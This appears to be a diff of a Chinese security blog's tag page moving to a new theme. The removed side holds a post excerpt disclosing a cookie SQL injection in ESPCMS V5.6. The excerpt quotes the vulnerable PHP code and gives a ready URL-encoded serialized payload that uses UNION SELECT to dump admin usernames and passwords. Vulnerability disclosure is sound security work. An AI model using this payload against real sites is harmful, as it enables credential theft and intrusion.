@@ -1,132 +1,216 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Tag: Cookie注入 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Tag: Cookie注入 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Tag: Cookie注入 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="tag-icon">Cookie注入</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-04-12T00:09:32.000Z" itemprop="datePublished">
-          2013-04-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/Cookie注入/'>Cookie注入</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/990.seo/">易思ESPCMS Cookie注入</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>易思ESPCMS企业网站管理系统基于LAMP开发构建的企业网站管理系统。</p>  <p>易思ESPCMS企业网站管理系统V5.6存在<a href="http://ha.cker.in/tag/Cookie注入" target="_blank">Cookie注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>   <div id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:5efce5bb-b75c-4f7e-af58-060d623dc458" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre name="code" class="php:nogutter:nocontrols">function in_list() {<br><br>parent::start_pagetemplate();<br><br>$lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br><br>$cartid = $this-&gt;fun-&gt;accept(‘ecisp_order_list’, ‘C’); //接收cookies[‘ecisp_order_list’]<br><br>$cartid = stripslashes(htmlspecialchars_decode($cartid));<br><br>$uncartid = !empty($cartid) ? unserialize($cartid) : 0; //$cartid有特殊的格式要求<br><br>if ($uncartid &amp;&amp; is_array($uncartid)) {<br><br>$didarray = $this-&gt;fun-&gt;key_array_name($uncartid, ‘did’, ‘amount’);<br><br>$didlist = $this-&gt;fun-&gt;format_array_text(array_keys($didarray), ‘,’);<br><br>if (!empty($didlist)) {<br><br>$db_table = db_prefix . ‘document’;<br><br>$db_where = “isclass=1 AND isorder=1 AND did in($didlist) ORDER BY did DESC”;<br><br>$sql=”SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,addtime,template,filename,filepath FROM $db_table WHERE $db_where”; //动态构造sql语句<br><br>$rs = $this-&gt;db-&gt;query($sql); //直接带入查询<br><br></pre></div><br>直接获取cookies[<code>ecisp_order_list</code>]的值，没有经过过滤，直接被用来构造了sql语句，并带入了查询。所以此处形成了一个cookie注入。</p>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
 
-<p>接收到的cookies[<code>ecisp_order_list</code>]在整个传递过程中，经过了htmlspecialchars_decode()、stripslashes()、unserialize()、key_array_name()、array_keys()、format_array_text()几个函数。</p>
-
-<p>其中stripslashes()使得注入语句可以无视GPC的影响。</p>
-
-<p>但是，由于unserialize()的使用，使得构造exp的难度加大；因为传入unserialize()的值，必须使用一种规定的特殊格式（实施上，我也没有完全吃透这个特殊格式）</p>
-
-<p>我就依靠运气，和一点小技巧，成功地构造出了exp，这里就不细说了。大家可以通过打印几个函数的返回值，来找到构造的方法。（或者，也可以通过下面的exp，来找寻一些规律）</p>
-
-<p>a%3a1%3a%7bs%3a3%3a%22k23%22%3ba%3a2%3a%7bs%3a3%3a%22did%22%3bs%3a159%3a%2224)+and+1%3d2+union+select+1%2c2%2c3%2c4%2c5%2c6%2c7%2c8%2c9%2c10%2c11%2c12%2c13%2c14%2c15%2c16%2cpassword%2cusername%2c19%2c20%2c21%2c22%2c23%2c24%2c25%2c26%2c27%2c28%2c29%2c30%2c31+from+espcms_admin_member+where+1+in+(1%22%3bs%3a6%3a%22amount%22%3bi%3a1%3b%7d%7d</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/990.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+  <section class="post" itemscope itemprop="blogPost">
   
-  <nav class="pagination" role="pagination">
-    
-    <span class="page-number">Page 1 of 1</span>
-    
-  </nav>
-</main>
-
-
-      
-<footer class="site-footer">
+    <a href="/990.seo/" title="易思ESPCMS Cookie注入" itemprop="url">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+    <h1 itemprop="name">易思ESPCMS Cookie注入</h1>
+    
+    <time datetime="2013-04-12T00:09:32.000Z" itemprop="datePublished">2013-04-12</time>
+  </a>
+</section>
+
+
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
